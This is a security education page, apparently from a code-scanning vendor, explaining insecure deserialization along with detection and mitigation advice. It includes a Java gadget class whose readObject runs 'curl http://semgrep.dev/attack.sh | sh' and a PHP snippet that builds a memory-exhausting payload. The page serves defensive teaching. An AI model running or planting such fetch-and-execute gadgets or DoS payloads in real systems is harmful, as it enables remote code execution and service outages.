---
title: Insecure Deserialization
description: Learn about Insecure Deserialization vulnerabilities
hide_title: false
displayed_sidebar: learnSidebar
slug: /learn/vulnerabilities/insecure-deserialization
---

# Insecure Deserialization

A single line of code that looks like it just restores state can instead grant remote access to your server. Deserialization vulnerabilities are easy to overlook, and also easy to exploit.

If your application takes serialized data from a file, a cookie, or a network request, and restores it into an object, then you're potentially at risk. Insecure deserialization lets attackers provide specially crafted data that executes code, reads files, or causes the application to crash.

Deserialization was designed to reconstruct complex objects, but when used on untrusted input, it can reconstruct more than just data.

In this article, we explain what serialization and deserialization are and why these features exist. Then we walk through common attack techniques and show what insecure deserialization looks like in code. Finally, we give you clear guidance to reduce your exposure and detect these issues early.



## What Is Serialization?

Serialization is the process of turning objects into a stream of bytes or text so they can be stored or sent over the network. Deserialization is the reverse: converting that stream back into usable objects.

This is a practical solution to a common problem. Developers need a way to store session data, share structured objects between services, or persist application state across runs.

Most programming languages include built-in or standard libraries for serialization. These libraries often support complex types, not just simple data. Some even let developers define how the serialization process works. This power is useful… but risky.

The danger arises when these libraries are used to deserialize data that comes from outside the application, such as HTTP request bodies or uploaded files. Many deserialization functions do more than just reconstruct data. They may call constructors, restore method references, or trigger custom behavior. This means that malicious input can trigger unexpected code execution.


## How Insecure Deserialization Gets Exploited

When a deserialization function instantiates objects, it may invoke code as part of that process. If an attacker controls the input, they can choose what classes get instantiated and which methods are run. This commonly is escalated into remote code execution, or denial of service.

### Remote Code Execution (RCE)

In Java, for instance, objects can implement the `readObject` method, which is called automatically during deserialization. A payload that includes such an object can execute code when loaded:

```java
public class Exploit implements Serializable {
    private void readObject(ObjectInputStream in) throws Exception {
        Runtime.getRuntime().exec("curl http://semgrep.dev/attack.sh | sh");
    }
}
```

If this class is included in a serialized stream, any system that deserializes it will run the payload.

This type of attack has been used in the wild against systems that deserialize input from cookies, form data, or APIs. The impact is often full system compromise.

### Denial of Service (DoS)

Some deserialization libraries allow deeply nested or complex object graphs. An attacker can craft a payload that consumes excessive memory or CPU when deserialized.

In PHP, using the `unserialize` function on input like this can crash the server:

```php
$a = 'a:10000:{';
for ($i = 0; $i < 10000; $i++) {
    $a .= "i:$i;s:10000:\"".str_repeat("A", 10000)."\";";
}
$a .= '}';
```

This results in exponential memory usage and can exhaust system resources.


## How To Detect Insecure Deserialization in Code

Let’s look at an example in a web application server. The code receives a POST request, extracts data, and deserializes it to handle a business object:

```java
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
Object data = in.readObject();
```

Here, `readObject()` reconstructs a full object graph from input the user controls. If any class in scope has custom deserialization behavior, it might be triggered automatically.

This is the core pattern of insecure deserialization:

- Untrusted input (e.g., from a network request or file upload)
- Flows into a deserialization function (e.g., `readObject`, `unserialize`, `pickle.load`)
- Without validation, filtering, or integrity checking

To find these patterns, you need to trace the flow of data from input to sink.

Semgrep makes this easier. It tracks taint flow from user-controlled input (like `request.getInputStream()` or `$_POST`) into sensitive functions. If it detects that a deserialization method receives untrusted data, it raises an alert. Semgrep supports multiple languages and includes rules for common deserialization functions. It focuses on cases where the deserialization function is reachable by untrusted input.


## How To Reduce Your Risk

The most effective way to prevent insecure deserialization is to avoid deserializing untrusted input entirely. If you must deserialize user-controlled data, take the following steps:

**1. Use safer formats**

Prefer simple data formats like JSON or YAML (with safe loading). These formats reconstruct primitive types like strings, arrays, and dictionaries.

**2. Validate input structure**

If you must deserialize, apply strict validation first. Check the input against a schema or known allowlist of expected fields before processing.

**3. Require digital signatures**

Signed tokens ensure that serialized data cannot be altered without detection. This helps secure session data or configuration blobs sent by the client.

**4. Disable unsafe features**

Some libraries let you configure safe modes. For example, in Python use `yaml.safe_load()` instead of `yaml.load()`. In Java, use deserialization filters to restrict what classes can be loaded.

**5. Review third-party dependencies**

Some libraries store internal state using deserialization under the hood. Ensure that these are not exposed to untrusted input and check for any known CVEs related to insecure deserialization.

**6. Use automated tools**

Semgrep can detect deserialization risks in your code and in libraries you use. Run it as part of your development process to catch problems early.


## Conclusion

Insecure deserialization happens when applications trust input that was never meant to be trusted. The feature was designed to restore objects. But when misused, they allow attackers to take full control of the system.

A single deserialization call might look harmless, but as we've seen, it can open the door to far more than just data. By understanding the risks, choosing safer alternatives, and using tools like Semgrep to catch unsafe patterns early, you can keep this powerful feature from becoming a security liability.
